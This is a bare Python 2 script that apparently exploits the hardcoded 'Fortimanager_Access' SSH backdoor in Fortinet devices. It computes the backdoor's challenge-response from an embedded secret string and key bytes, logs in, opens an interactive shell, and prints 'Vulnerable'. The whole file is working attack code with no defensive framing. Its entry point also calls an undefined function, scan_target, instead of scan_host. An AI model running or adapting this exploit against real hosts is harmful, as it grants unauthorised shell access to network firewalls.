import socket
import select
import sys
import paramiko
from paramiko.py3compat import u
import base64
import hashlib
import termios
import tty

def custom_handler(title, instructions, prompt_list):
    n = prompt_list[0][0]
    m = hashlib.sha1()
    m.update('\x00' * 12)
    m.update(n + 'FGTAbc11*xy+Qqz27')
    m.update('\xA3\x88\xBA\x2E\x42\x4C\xB0\x4A\x53\x79\x30\xC1\x31\x07\xCC\x3F\xA1\x32\x90\x29\xA9\x81\x5B\x70')
    h = 'AK1' + base64.b64encode('\x00' * 12 + m.digest())
    return [h]


def scan_host(targetIP):
    global file_mutex
    global results_fd

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(targetIP, username='', allow_agent=False, look_for_keys=False,timeout=5)
    except paramiko.ssh_exception.SSHException:
        #print "debug:connect error"
        pass

    trans = client.get_transport()
    try:
        trans.auth_password(username='Fortimanager_Access', password='', event=None, fallback=True)
    except paramiko.ssh_exception.AuthenticationException:
        #print "debug:auth failed"
        pass

    trans.auth_interactive(username='Fortimanager_Access', handler=custom_handler)
    chan = client.invoke_shell()
    
    try:
        chan.settimeout(10.10)
        try:
            x = u(chan.recv(1024))
            return 1
        except socket.timeout:
            #print "debug:socket timeout"
            pass
    finally:
        pass

    return 0


def exec_task(str):
    if scan_host(str)==1:
        return "1"
    return "0"

if __name__ == '__main__':
    if scan_target(sys.argv[1]):
        print 'Vulnerable'
    print 'Proc exit'


















